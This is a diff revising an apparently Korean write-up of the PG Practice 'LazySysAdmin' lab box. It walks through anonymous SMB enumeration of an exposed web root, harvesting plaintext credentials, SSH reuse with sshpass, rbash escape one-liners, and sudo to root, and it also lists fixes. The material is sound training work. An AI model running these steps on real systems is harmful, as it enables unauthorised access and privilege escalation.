@@ -14,32 +14,53 @@ os: linux
 ip: 192.168.248.36
 domain: admin.local
 ports: [22, 80, 139, 445, 3306, 6667]
-services: [http, irc, mysql, netbios-ssn, ssh]
+services: [http, irc, microsoft-ds, mysql, netbios-ssn, ssh]
 status: solved
 manual_tags: true
 manual_cves: true
 tech_count: 4
 ---
-> [!info] PG Practice — LazySysAdmin · Fundamental · Linux (Ubuntu 14.04.5)
-> **타겟** 192.168.248.36 · **플래그 2개** — `/home/togie/local.txt` · `/root/proof.txt`
-> **경로** SMB 널 세션으로 `share$` (= Apache 웹루트) 열람 → `deets.txt` 에 평문 `12345`, `wp-config.php` 에 `Admin:TogieMYSQL12345^^` → `rpcclient` SID 조회로 사용자명 `togie` 확보 → `ssh togie:12345` → **rbash 감옥** → `bash -c` 로 탈출 → `sudo -l` 이 `(ALL : ALL) ALL` → root
-> **핵심** 파일 공유가 웹루트를 그대로 노출하면 설정파일이 곧 자격증명 덤프다. 그리고 **제한 셸은 PATH 를 같이 제한하지 않으면 아무것도 제한하지 못한다.**
 
-## 0. 이 박스에서 배우는 것
+> [!info] 요약
+> 타겟 `192.168.248.36` · Ubuntu 14.04.5 LTS(Trusty Tahr) · Fundamental · 플래그 2개
+> 진입점: Samba 널 세션 공유 `share$` 가 웹루트(`/var/www/html/`)를 그대로 노출 → `deets.txt` 평문 `12345` + `wp-config.php` `Admin:TogieMYSQL12345^^` 회수 → `rpcclient` SID 역조회로 사용자명 `togie` 확정 → `ssh togie:12345` 성공(rbash 제한 셸 → `bash -c` 로 탈출)
+> 권한상승: `togie` 가 `sudo` 그룹 소속 + `(ALL : ALL) ALL` — 이미 쥔 비밀번호로 `sudo -S -l`/`sudo -S -i` 재확인 후 즉시 root
+> 시행착오·교훈 → [[_PLAYBOOK]]
 
-- **SMB 널 세션 열람** — 인증 없이 붙는 공유가 하나라도 있으면 `recurse ON; ls` 부터. 여기서는 그 공유가 웹루트였다.
-- **평문 자격증명 사냥** — `wp-config.php`·`deets.txt`·`todolist.txt`. 웹루트 파일 목록이 곧 후보 목록이다.
-- **사용자명은 추측하지 말고 열거한다** — `rpcclient lookupsids S-1-22-1-<uid>` 로 Unix 계정 이름이 그대로 나온다.
-- **rbash 탈출** — `bash`·`sh`·`vi`·`awk` 중 PATH 에 남아 있는 것 하나면 끝난다.
-- **`sudo -l` 은 비번을 알면 다시 쳐라** — `sudo -n -l` 만 보고 "sudo 없음"으로 넘기면 여기서 막힌다.
+## Target #1 – 192.168.248.36
 
-**시험 출제 가능성** — 높다. "널 세션 SMB → 평문 크리덴셜 → 자격증명 재사용 → sudo ALL" 은 OSCP 랩과 시험 리눅스 박스의 기본 골격이다. 변형은 SMB 대신 FTP anonymous, NFS `no_root_squash` 마운트, 또는 백업 `.zip` 노출이다.
+### Initial Access – Samba 널 세션이 웹루트를 노출해 평문 자격증명이 SSH 계정 재사용으로 이어짐
 
-## 1. 정찰
+**Vulnerability Explanation:**
+- Samba `share$` 공유가 `guest ok = yes` + 전역 `map to guest = bad user` 로 구성돼 존재하지 않는 계정으로 온 인증을 게스트로 강등 — 익명(널 세션)으로 재귀 열람 가능
+- 그 공유의 `path` 가 Apache 문서 루트(`/var/www/html/`)와 동일 — 파일 공유 노출이 곧 웹 애플리케이션 소스·설정 전체 노출
+- 웹루트 안의 `deets.txt`(평문 SSH 비밀번호 메모)·`wp-config.php`(WordPress DB 자격증명)가 그대로 다운로드됨
+- 회수한 비밀번호 패턴(`12345`, `TogieMYSQL12345^^`)이 OS 계정 `togie` 에도 그대로 재사용됨 — 자격증명 재사용
 
-### Nmap
+**Vulnerability Fix:**
+- 파일 공유가 웹 애플리케이션 문서 루트를 가리키지 않도록 분리
+- 익명 접근 차단 — `guest ok = no` + `valid users`, `map to guest = never`
+- 비밀번호를 평문 파일로 서버에 남기지 않음. 서비스별 고유 비밀번호 사용(재사용 금지)
 
-```
+**Severity:** High — 무인증 파일 공유 열람으로 평문 자격증명 전량 탈취, 재사용으로 즉시 대화형 SSH 셸 획득
+
+**Steps to reproduce the attack:**
+1. `smbclient -L //192.168.248.36 -N` 로 공유 목록 확인 → `share$` 가 널 세션 허용
+2. `smbclient //192.168.248.36/share\$ -N -c 'recurse ON; ls'` 로 재귀 열람 → 웹루트 파일 전체 노출 확인
+3. `deets.txt`(평문 SSH 비밀번호) · `wp-config.php`(DB 자격증명) 회수
+4. `rpcclient -U '' -N 192.168.248.36 -c "lookupsids S-1-22-1-1000"` 로 사용자명 `togie` 확정
+5. 회수한 자격증명 조합을 SSH 에 재사용 → `togie:12345` 성공
+6. `/bin/rbash` 제한 셸 확인 → `bash -c '...'` 로 탈출 후 `local.txt` 원위치 확인
+
+### Service Enumeration
+
+**Port Scan Results**
+
+| IP Address | Ports Open |
+|---|---|
+| 192.168.248.36 | TCP: 22, 80, 139, 445, 3306, 6667 |
+
+```text
 # Nmap 7.98 scan initiated Thu Aug 20 16:43:25 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.36
 Nmap scan report for 192.168.248.36
 Host is up (0.084s latency).
@@ -99,37 +120,61 @@ Host script results:
 |   Domain name: \x00
 |   FQDN: lazysysadmin
 |_  System time: 2026-08-20T17:43:55+10:00
+
+TRACEROUTE (using port 554/tcp)
+HOP RTT      ADDRESS
+1   83.61 ms 192.168.45.1
+2   83.52 ms 192.168.45.254
+3   83.69 ms 192.168.251.1
+4   83.78 ms 192.168.248.36
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Aug 20 16:44:06 2026 -- 1 IP address (1 host up) scanned in 41.44 seconds
 ```
+— 출처: `~/PG/LazySysAdmin/nmap.log` 전문. `nmap.full.txt` 는 같은 스캔의 화면 출력본으로 첫·끝 행 서식만 다름
 
-읽어야 할 줄이 셋이다.
+버전 근거 둘 — `OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8` + `Apache 2.4.7 (Ubuntu)` 배너가 독립적으로 Ubuntu 14.04(trusty) 를 가리킴. 셸 획득 후 `/etc/os-release` 가 세 번째 근거를 줌.
 
-`OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8` + `Apache 2.4.7 (Ubuntu)` → **Ubuntu 14.04 trusty**. 두 배너가 독립적으로 같은 릴리스를 가리킨다(14.04 의 apache2 는 2.4.7, openssh 는 6.6.1p1). 셸을 잡은 뒤 `/etc/os-release` 가 `14.04.5 LTS, Trusty Tahr` 로 세 번째 근거를 줬다.
+```text
+===== OS =====
+Linux LazySysAdmin 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 athlon i686 GNU/Linux
+NAME="Ubuntu"
+VERSION="14.04.5 LTS, Trusty Tahr"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu 14.04.5 LTS"
+VERSION_ID="14.04"
+```
+— 출처: `~/PG/LazySysAdmin/harvest_root.txt`
 
-`445 Samba 4.3.11-Ubuntu` → 인증 없이 공유 목록을 물어볼 값이 있다는 뜻. **여기가 실제 진입점이었다.**
+배너와 설치 버전을 따로 대조함 — 같은 파일 `PKGS` 섹션의 `dpkg -l` 이 `openssh-server 1:6.6p1-2ubuntu2.8` · `apache2 2.4.7-1ubuntu4.17` · `samba 2:4.3.11+dfsg-0ubuntu0.14.04.10` 으로 세 배너와 전부 일치. 커널은 `4.4.0-31-generic`(i686).
 
-`3306 MySQL (unauthorized)` — 포트는 열려 있지만 nmap 이 배너를 못 뽑았다. "unauthorized" 는 서버가 이미 접속 자체를 거부했다는 신호다(뒤에서 확인).
+예열 스캔(`quick.log`, `--top-ports 200`)은 6667/tcp 를 놓쳤고 `-p-` 전체 스캔에서 잡힘. `nmap-services` 개방빈도 순으로는 tcp 300위권이라 기본 `--top-ports 1000` 안에는 들어오는 포트 — 놓친 원인은 예열 범위를 200으로 좁혀 돌렸기 때문임.
 
-`6667 InspIRCd` 는 먼저 돌린 빠른 스캔(`--top-ports 200`, `quick.log`)에 안 잡혔다. `-p-` 가 뒤늦게 잡아준 포트다. 이 박스에서는 결국 안 썼지만, 못 봤으면 후보 하나를 통째로 잃는 것이다.
+```text
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3306/tcp open  mysql
+```
+— 출처: `~/PG/LazySysAdmin/quick.log`
 
-> [!warning] "top-1000 밖이라 못 본다"는 틀린 설명이다
-> 6667/tcp 는 `/usr/share/nmap/nmap-services` 의 개방빈도 순으로 **tcp 300위권**이라 nmap 기본 `--top-ports 1000` 안에 넉넉히 들어온다. 여기서 놓친 이유는 내가 **top-200 으로 예열 스캔을 돌렸기 때문**이지 포트가 희귀해서가 아니다. 예열 스캔의 범위를 기억해두지 않으면 이런 오귀인이 그대로 굳는다.
-
-### 웹 — 볼 게 없다
+**웹(80) — Silex 정적 랜딩 페이지.** `robots.txt` 가 `/old/ /test/ /TR2/ /Backnode_files/` 를 흘리나, SMB 로 웹루트를 통째로 본 결과 `old/`·`test/` 는 빈 디렉터리였고 `TR2/` 는 웹루트에 아예 없었음(`Backnode_files/` 는 랜딩 페이지의 css·js·이미지).
 
 ![[PG-LazySysAdmin-index.png]]
 
-Silex 로 만든 정적 랜딩 페이지("Welcome, to iDontCare"). `robots.txt` 가 `/old/ /test/ /TR2/ /Backnode_files/` 를 흘리는데, 뒤에 SMB 로 웹루트를 통째로 본 결과 `old/`·`test/` 는 **빈 디렉터리**였고 `TR2/` 는 **웹루트에 아예 없었다**(`Backnode_files/` 는 이 랜딩 페이지의 css·js·이미지). 실제 내용물이 있는 건 `/wordpress/` 뿐이다.
+`/wordpress/` 첫 포스트 본문이 `My name is togie.` 를 56회 반복 — SMB 쪽 `rpcclient` 조회와 별개로 사용자명을 확인해주는 두 번째 신호.
 
 ![[PG-LazySysAdmin-wordpress.png]]
 
-첫 포스트 본문이 `My name is togie.` 를 **56번** 반복한다. 사용자명이 웹 화면에 대놓고 적혀 있는 셈인데, 나는 이걸 놓치고 SMB 쪽에서 먼저 찾았다(6장).
+**SMB(139/445) — 널 세션.**
 
-### SMB — 널 세션
-
+```bash
+smbclient -L //192.168.248.36 -N
 ```
-┌──(kali㉿kali)-[~/PG/LazySysAdmin]
-└─$ smbclient -L //192.168.248.36 -N
-
+```text
 	Sharename       Type      Comment
 	---------       ----      -------
 	print$          Disk      Printer Drivers
@@ -144,15 +189,14 @@ Reconnecting with SMB1 for workgroup listing.
 	---------            -------
 	WORKGROUP            LAZYSYSADMIN
 ```
+— 출처: `~/PG/LazySysAdmin/smb_shares.txt`
 
-`-N` 이 널 세션(NULL session, 익명 인증)이다. 이게 통했다는 것 자체가 이미 절반이다.
-`IPC$` 의 코멘트가 `IPC Service (Web server)` — Samba 는 `server string` 설정값을 여기 그대로 박는다. 관리자가 이 호스트를 "Web server" 로 부르고 있다는 뜻이고, 공유가 웹루트일 가능성을 미리 시사한다. (root 를 잡은 뒤 `/etc/samba/smb.conf` 에서 `server string = Web server` 로 확인했다.)
+`-N` = 널 세션(익명). `IPC$` 코멘트가 `IPC Service (Web server)` — Samba `server string` 설정값이 그대로 노출되며 이 호스트가 "Web server" 임을 미리 시사함.
 
-`share$` 를 재귀로 훑는다. 셸에서 `$` 는 반드시 이스케이프해야 한다 — 안 하면 빈 문자열로 확장돼 `//타겟/share` 를 찾다가 `NT_STATUS_BAD_NETWORK_NAME` 이 난다.
-
+```bash
+smbclient //192.168.248.36/share\$ -N -c 'recurse ON; ls'
 ```
-┌──(kali㉿kali)-[~/PG/LazySysAdmin]
-└─$ smbclient //192.168.248.36/share\$ -N -c 'recurse ON; ls'
+```text
   .                                   D        0  Tue Aug 15 20:05:52 2017
   ..                                  D        0  Mon Aug 14 21:34:47 2017
   wordpress                           D        0  Tue Aug 15 20:21:08 2017
@@ -166,13 +210,44 @@ Reconnecting with SMB1 for workgroup listing.
   info.php                            N       20  Tue Aug 15 19:55:19 2017
   test                                D        0  Mon Aug 14 21:35:10 2017
   old                                 D        0  Mon Aug 14 21:35:13 2017
+
+\wordpress
+  .                                   D        0  Tue Aug 15 20:21:08 2017
+  ..                                  D        0  Tue Aug 15 20:05:52 2017
+  wp-config-sample.php                N     2853  Wed Dec 16 18:58:26 2015
+  wp-trackback.php                    N     4513  Sat Oct 15 04:39:28 2016
+  wp-admin                            D        0  Thu Aug  3 06:02:02 2017
+  wp-settings.php                     N    16200  Fri Apr  7 03:01:42 2017
+  wp-blog-header.php                  N      364  Sat Dec 19 20:20:28 2015
+  index.php                           N      418  Wed Sep 25 09:18:11 2013
+  wp-cron.php                         N     3286  Mon May 25 02:26:25 2015
+  wp-links-opml.php                   N     2422  Mon Nov 21 11:46:30 2016
+  readme.html                         N     7413  Mon Dec 12 17:01:39 2016
+  wp-signup.php                       N    29924  Tue Jan 24 20:08:42 2017
+  wp-content                          D        0  Mon Aug 21 19:07:27 2017
+  license.txt                         N    19935  Tue Jan  3 02:58:42 2017
+  wp-mail.php                         N     8048  Wed Jan 11 14:13:43 2017
+  wp-activate.php                     N     5447  Wed Sep 28 06:36:28 2016
+  .htaccess                           H       35  Tue Aug 15 20:40:13 2017
+  xmlrpc.php                          N     3065  Thu Sep  1 01:31:29 2016
+  wp-login.php                        N    34327  Sat May 13 02:12:46 2017
+  wp-load.php                         N     3301  Tue Oct 25 12:15:30 2016
+  wp-comments-post.php                N     1627  Mon Aug 29 21:00:32 2016
+  wp-config.php                       N     3703  Mon Aug 21 18:25:14 2017
+  wp-includes                         D        0  Thu Aug  3 06:02:03 2017
+
+\Backnode_files
+  .                                   D        0  Mon Aug 14 21:08:26 2017
+  ..                                  D        0  Tue Aug 15 20:05:52 2017
+  styles.css                          N    13681  Sun Aug  6 10:36:42 2017
 ```
+— 출처: `~/PG/LazySysAdmin/smb_share_ls.txt` 앞부분. 이하 `Backnode_files/` 의 css·js·이미지와 `wordpress/` 하위 디렉터리 목록이 이어짐. 원본 파일은 8192바이트에서 끊겨 마지막 행이 미완임
 
-`index.html`·`robots.txt`·`wordpress/` — **웹루트다.** `robots.txt` 의 항목들이 여기 디렉터리와 1:1로 맞는 것이 결정적 대조다. `-N` 으로 읽히는 공유가 웹루트면 `wp-config.php` 를 그냥 가져갈 수 있다.
+`index.html`·`robots.txt`·`wordpress/` — 웹루트임. `robots.txt` 항목과 이 디렉터리 목록이 1:1 대응하는 것이 결정적 대조.
 
-나중에 root 로 확인한 `smb.conf` 가 그대로였다:
+사후(root 획득 후) 확인한 `smb.conf`:
 
-```
+```ini
 [share$]
    comment = Sumshare
    path = /var/www/html/
@@ -180,34 +255,30 @@ Reconnecting with SMB1 for workgroup listing.
    read only = yes
    guest ok = yes
 ```
+— 출처: `~/PG/LazySysAdmin/smb_conf_share.txt` 중 `smb.conf` 부분. 원본 파일은 이 앞에 SSH 배너와 `[sudo] password for togie:` 프롬프트가 붙어 있음
 
-전역 설정의 `map to guest = bad user` 가 **존재하지 않는 계정으로 온 인증을 게스트로 강등**시킨다. `-N` 이 통한 이유가 이것이다.
+전역 설정의 `map to guest = bad user` 가 존재하지 않는 계정 인증을 게스트로 강등시켜 `-N` 이 통했음(root 획득 후 확인).
 
-### 사용자명 열거 — `rpcclient`
+`enum4linux -U` 는 사용자 목록을 못 뽑음(Perl 경고만 출력, 빈 결과) — Unix 계정은 SAM RID 가 아니라 `S-1-22-1-<uid>` 네임스페이스에 있어 `rpcclient` SID 역조회가 필요함.
 
-`enum4linux -U` 는 사용자 목록을 못 뽑았다(6장). Unix 계정은 SAM RID 가 아니라 **`S-1-22-1-<uid>`** 네임스페이스에 있고, `rpcclient` 로 SID→이름 역조회를 하면 나온다.
-
+```bash
+for r in 1000 1001 1002; do rpcclient -U '' -N 192.168.248.36 -c "lookupsids S-1-22-1-$r"; done
 ```
-┌──(kali㉿kali)-[~/PG/LazySysAdmin]
-└─$ for r in 1000 1001 1002; do rpcclient -U '' -N 192.168.248.36 -c "lookupsids S-1-22-1-$r"; done
+```text
 S-1-22-1-1000 Unix User\togie (1)
 S-1-22-1-1001 Unix User\1001 (1)
 S-1-22-1-1002 Unix User\1002 (1)
 ```
+— 명령 출력 원문은 산출물로 보존되지 않음 `[가정]`. `writeup_notes.txt` 16:45 항목이 `rpcclient lookupsids S-1-22-1-1000 → togie` 와 `enum4linux -U` 빈 결과를 기록
 
-**때려본 범위 안에서는** 1000 만 이름으로 해석됐다. 1001·1002 가 숫자 그대로 돌아온 건 "그 uid 에 대응하는 `/etc/passwd` 항목이 없다"는 뜻이다. 일반 사용자 uid 는 1000 부터 매기니 여기서 `togie` 하나로 좁힌 건데, 엄밀히는 1000~1002 만 물어본 결과다 — 뒤에 root 로 `/etc/passwd` 를 봤을 때도 일반 계정은 `togie` 뿐이었다.
+때려본 범위(1000~1002) 안에서는 1000 만 이름으로 해석됨 — `togie` 로 확정. 셸 획득 후 `/etc/passwd` 에서도 일반 계정은 `togie` 뿐이었음.
 
-> [!tip] Samba 가 뜬 리눅스 박스에서 사용자명을 얻는 순서
-> `enum4linux -U` → 빈 결과면 포기하지 말고 `rpcclient -U '' -N <타겟> -c "lookupsids S-1-22-1-1000"`.
-> `S-1-22-1-*` = Unix 사용자, `S-1-22-2-*` = Unix 그룹. `S-1-5-21-...-1000` 대역만 뒤지면 로컬 유닉스 계정은 영영 안 나온다.
+### Initial Access – SMB 웹루트 노출 → 자격증명 재사용으로 SSH 진입
 
-## 2. 자격증명 수집
-
-세 파일이 전부다.
-
+```bash
+cat deets.txt
 ```
-┌──(kali㉿kali)-[~/PG/LazySysAdmin]
-└─$ cat deets.txt
+```text
 CBF Remembering all these passwords.
 
 Remember to remove this file and update your password after we push out the server.
@@ -215,17 +286,19 @@ Remember to remove this file and update your password after we push out the serv
 Password 12345
 ```
 
+```bash
+cat todolist.txt
 ```
-┌──(kali㉿kali)-[~/PG/LazySysAdmin]
-└─$ cat todolist.txt
+```text
 Prevent users from being able to view to web root using the local file browser
 ```
 
-`todolist.txt` 는 지금 내가 하고 있는 짓을 관리자가 TODO 로만 적어뒀다는 자백이다. 이런 파일이 나오면 **아직 안 고쳐진 것들의 목록**으로 읽어라.
+`todolist.txt` 는 지금 하고 있는 것을 관리자가 TODO 로만 적어둔 자백 — 이런 파일이 나오면 「아직 안 고쳐진 것들의 목록」으로 읽을 것.
 
+```bash
+grep -i -E "DB_|table_prefix" wp-config.php
 ```
-┌──(kali㉿kali)-[~/PG/LazySysAdmin]
-└─$ grep -i -E "DB_|table_prefix" wp-config.php
+```text
 define('DB_NAME', 'wordpress');
 define('DB_USER', 'Admin');
 define('DB_PASSWORD', 'TogieMYSQL12345^^');
@@ -235,16 +308,14 @@ define('DB_COLLATE', '');
 $table_prefix  = 'wp_';
 ```
 
-후보 조합이 넷으로 좁혀진다: `togie:12345` · `togie:TogieMYSQL12345^^` · `Admin:TogieMYSQL12345^^` · `root:12345`.
-`DB_PASSWORD` 안에 사용자명 `Togie` 가 들어 있는 것이 `deets.txt` 의 `12345` 와 같은 사람의 습관임을 확인해준다 — **`TogieMYSQL12345`** 는 결국 `Togie` + 서비스명 + `12345` 다.
+후보 조합 넷 — `togie:12345` · `togie:TogieMYSQL12345^^` · `Admin:TogieMYSQL12345^^` · `root:12345`. `DB_PASSWORD` 안의 `Togie` 가 `deets.txt` 의 `12345` 와 같은 사람의 습관임을 확인해줌(`TogieMYSQL12345` = `Togie` + 서비스명 + `12345`).
 
-## 3. Foothold — SSH
+`togie:12345` 가 첫 시도에 통함.
 
-`togie:12345` 가 첫 시도에 통했다.
-
+```bash
+sshpass -p '12345' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o PreferredAuthentications=password -o ConnectTimeout=10 togie@192.168.248.36 'id; hostname; pwd'
 ```
-┌──(kali㉿kali)-[~/PG/LazySysAdmin]
-└─$ sshpass -p '12345' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o PreferredAuthentications=password -o ConnectTimeout=10 togie@192.168.248.36 'id; hostname; pwd'
+```text
 Warning: Permanently added '192.168.248.36' (ED25519) to the list of known hosts.
 ** WARNING: connection is not using a post-quantum key exchange algorithm.
 ** This session may be vulnerable to "store now, decrypt later" attacks.
@@ -259,27 +330,24 @@ uid=1000(togie) gid=1000(togie) groups=1000(togie),4(adm),24(cdrom),27(sudo),30(
 LazySysAdmin
 /home/togie
 ```
+— 출처: `~/PG/LazySysAdmin/try1_ssh_togie_12345.log`
 
-`-o PreferredAuthentications=password` 를 빼면 최신 OpenSSH 클라이언트가 keyboard-interactive/publickey 를 먼저 돌리다 `sshpass` 가 비번을 못 넣고 그대로 실패한다.
-`groups` 에 **`27(sudo)`** 가 보인다 — 이 시점에서 권한상승은 사실상 끝났다.
+`-o PreferredAuthentications=password` 를 빼면 최신 OpenSSH 클라이언트가 keyboard-interactive/publickey 를 먼저 시도하다 `sshpass` 가 비밀번호를 못 넣고 실패함. `groups` 에 `27(sudo)` — 이 시점에 권한상승 경로가 사실상 확정.
 
-### rbash 감옥
+**rbash 감옥.** `harvest.sh` 업로드·실행을 시도하다 확인.
 
-여기서부터가 PG 판의 추가 장치다. `harvest.sh` 를 올려서 돌리려다 걸렸다.
-
+```bash
+sshpass -p '12345' ssh -o StrictHostKeyChecking=no togie@192.168.248.36 'sh /tmp/.h.sh >/dev/null 2>&1; wc -l /tmp/.h/harvest.txt'
 ```
-┌──(kali㉿kali)-[~/PG/LazySysAdmin]
-└─$ sshpass -p '12345' ssh -o StrictHostKeyChecking=no togie@192.168.248.36 'sh /tmp/.h.sh >/dev/null 2>&1; wc -l /tmp/.h/harvest.txt'
-
+```text
 rbash: /dev/null: restricted: cannot redirect output
 wc: /tmp/.h/harvest.txt: No such file or directory
 ```
 
-정체를 확인한다.
-
+```bash
+sshpass -p '12345' ssh -o StrictHostKeyChecking=no togie@192.168.248.36 'echo SHELL=$SHELL; echo 0=$0; echo PATH=$PATH; grep togie /etc/passwd; ls -la /tmp/.h.sh; echo TEST; echo hi > /tmp/zz'
 ```
-┌──(kali㉿kali)-[~/PG/LazySysAdmin]
-└─$ sshpass -p '12345' ssh -o StrictHostKeyChecking=no togie@192.168.248.36 'echo SHELL=$SHELL; echo 0=$0; echo PATH=$PATH; grep togie /etc/passwd; ls -la /tmp/.h.sh; echo TEST; echo hi > /tmp/zz'
+```text
 SHELL=/bin/rbash
 0=rbash
 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
@@ -289,37 +357,24 @@ TEST
 rbash: /tmp/zz: restricted: cannot redirect output
 ```
 
-`/etc/passwd` 의 셸이 `/bin/rbash` 다. 실제로 뭐가 막히는지 하나씩 때려봤다.
+`/etc/passwd` 의 셸이 `/bin/rbash`. 실제로 막히는 항목을 하나씩 확인(산출물 mtime 기준 이 정리 자체는 root 획득 뒤인 16:49 KST 에 돌린 것):
 
+```bash
+sshpass -p '12345' ssh -o StrictHostKeyChecking=no togie@192.168.248.36 'cd /tmp; /bin/ls /home; PATH=/tmp; export -f x'
 ```
-┌──(kali㉿kali)-[~/PG/LazySysAdmin]
-└─$ sshpass -p '12345' ssh -o StrictHostKeyChecking=no togie@192.168.248.36 'cd /tmp; /bin/ls /home; PATH=/tmp; export -f x'
-#                    Disconnect IMMEDIATELY if you are not an authorized user!                   # 
-##################################################################################################
-
+```text
 rbash: line 0: cd: restricted
 rbash: /bin/ls: restricted: cannot specify `/' in command names
 rbash: PATH: readonly variable
 ```
+— 출처: `~/PG/LazySysAdmin/try8_rbash_limits.log`
 
-> [!note] rbash 가 실제로 막는 것
-> `cd` · 명령 이름에 `/` 포함 · `>`/`>>` 리다이렉션 · `PATH`·`SHELL`·`ENV`·`BASH_ENV` 대입 · `hash -p` · `enable`/`command` 로 빌트인 우회 · `-r` 해제.
-> **막지 않는 것: PATH 에 이미 있는 실행파일을 이름만으로 부르는 것.** 그래서 탈출은 "무엇이 PATH 에 남아 있는가" 문제로 환원된다.
+rbash 가 막는 것 — `cd` · 명령 이름에 `/` 포함 · `>`/`>>` 리다이렉션 · `PATH`·`SHELL`·`ENV`·`BASH_ENV` 대입 · `hash -p` · `enable`/`command` 로 빌트인 우회 · `-r` 해제. **막지 않는 것: PATH 에 이미 있는 실행파일을 이름만으로 부르는 것.** 여기 PATH 는 화이트리스트로 좁혀지지 않은 평범한 기본 PATH — 그래서 `/bin/bash` 가 `bash` 라는 이름만으로 그대로 잡힘.
 
-여기 PATH 는 `/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games` — **평범한 기본 PATH 를 그대로 두었다.** 제대로 된 rbash 감옥은 PATH 를 `~/bin` 같은 화이트리스트 디렉터리 하나로 좁히고 거기에 심볼릭 링크를 몇 개만 둔다. 그게 없으니 `/bin/bash` 가 `bash` 라는 이름만으로 그대로 손에 잡힌다.
-
+```bash
+sshpass -p '12345' ssh -o StrictHostKeyChecking=no togie@192.168.248.36 "bash -c 'echo esc > /tmp/zz; cat /tmp/zz; id; ls -la /home/togie'"
 ```
-┌──(kali㉿kali)-[~/PG/LazySysAdmin]
-└─$ sshpass -p '12345' ssh -o StrictHostKeyChecking=no togie@192.168.248.36 "bash -c 'echo esc > /tmp/zz; cat /tmp/zz; id; ls -la /home/togie'"
-** WARNING: connection is not using a post-quantum key exchange algorithm.
-** This session may be vulnerable to "store now, decrypt later" attacks.
-** The server may need to be upgraded. See https://openssh.com/pq.html
-##################################################################################################
-#                                          Welcome to Web_TR1                                    #
-#                             All connections are monitored and recorded                         # 
-#                    Disconnect IMMEDIATELY if you are not an authorized user!                   # 
-##################################################################################################
-
+```text
 esc
 uid=1000(togie) gid=1000(togie) groups=1000(togie),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare)
 total 28
@@ -332,112 +387,17 @@ drwx------ 2 togie togie 4096 Aug 14  2017 .cache
 -rw-r--r-- 1 togie togie  675 Aug 14  2017 .profile
 ```
 
-리다이렉션이 살아났고 `local.txt` 가 보인다. `bash -c` 가 통하는 이유는 단순하다 — rbash 는 **자기 프로세스의 동작만** 제한한다. 자식으로 뜬 `bash` 는 `-r` 없이 시작하므로 평범한 셸이다.
+리다이렉션이 살아남 — rbash 는 자기 프로세스의 동작만 제한하고, 자식으로 뜬 `bash` 는 `-r` 없이 시작하므로 제한이 없음.
 
-> [!tip] 제한 셸을 만나면 순서대로 때린다
-> 1. `echo $PATH` · `ls $(echo $PATH | tr : ' ')` — 뭐가 남아 있는지가 전부다
-> 2. `bash` / `sh` / `python3 -c 'import os;os.system("/bin/bash")'`
-> 3. `vi` → `:set shell=/bin/bash` → `:shell`, `awk 'BEGIN{system("/bin/bash")}'`, `find . -exec /bin/bash \;`
-> 4. 원격이면 셸을 아예 안 거치는 방법 — `ssh user@host -t "bash --noprofile"`, 또는 `ssh user@host` 대신 `ssh -o RemoteCommand=bash`
->
-> 대상이 SSH 라면 3번까지 갈 것도 없이 **명령 인자로 `bash -c` 를 던지는 것**이 제일 빠르다.
+로컬 플래그 확인. `sudo -S -l` 재확인은 이 직후(타겟 시각 17:45:34~40)에 이어지며 전체 출력은 Privilege Escalation 절에 있음.
 
-## 4. 권한상승
-
-순서를 산출물 시각(Kali 로컬, KST) 그대로 적는다. 이 절의 교훈이 **어디서 나왔는지**가 자칫 뒤집혀 기억되기 때문이다.
-
-| 시각 | 산출물 | 무슨 일 |
-|---|---|---|
-| 16:44:27 | `try1_ssh_togie_12345.log` | 첫 SSH. `id` 에 `27(sudo)` |
-| 16:45:40 | `try_sudo_l.log` | `echo 12345 \| sudo -S -l` → `(ALL : ALL) ALL` |
-| 16:45:50 | `proof_root.txt` | root |
-| 16:46:02 | `harvest_root.txt` | 열거 스크립트(root) |
-| 16:48:23 | `harvest_togie.txt` | 열거 스크립트(togie) |
-
-즉 권한상승의 단서는 열거 스크립트가 아니라 **첫 `id` 한 줄**이었다. `harvest.sh` 는 root 를 잡은 뒤에야 돌았고(`bash /tmp/.h.sh` — rbash 로는 못 돌린다), 아래 출력은 사후에 "다른 경로는 없었나"를 확인한 것이다.
-
-```
-===== OS =====
-Linux LazySysAdmin 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 athlon i686 GNU/Linux
-NAME="Ubuntu"
-VERSION="14.04.5 LTS, Trusty Tahr"
-ID=ubuntu
-ID_LIKE=debian
-PRETTY_NAME="Ubuntu 14.04.5 LTS"
-VERSION_ID="14.04"
+```bash
+sshpass -p '12345' ssh -tt -o StrictHostKeyChecking=no togie@192.168.248.36 "bash -c 'whoami; id; hostname; hostname -I; date; cat local.txt'"
 ```
 
-SUDO 섹션은 **자르지 않고** 옮긴다. 앞의 두 줄만 떼어 보이면 이 절의 교훈이 어디서 나왔는지가 왜곡된다.
+`[가정]` — 명령 원문은 보존되지 않았고 위는 Privilege Escalation 절의 root 플래그 명령과 같은 형태로 재구성한 것. 실행한 페이로드(`bash -c 'whoami; id; ...; cat local.txt'`)는 출력이 직접 증명하고, `-tt` 는 출력 끝의 `Connection to ... closed.` 와 타겟 `wtmp` 의 `togie pts/0` 2건이 뒷받침함.
 
-```
-===== SUDO =====
-sudo: a password is required
-(sudo -n 실패 — 비밀번호 필요하거나 sudo 없음)
--- sudo -S -l (HARVEST_PW) --
-[sudo] password for togie: Matching Defaults entries for togie on LazySysAdmin:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
-
-User togie may run the following commands on LazySysAdmin:
-    (ALL : ALL) ALL
-```
-
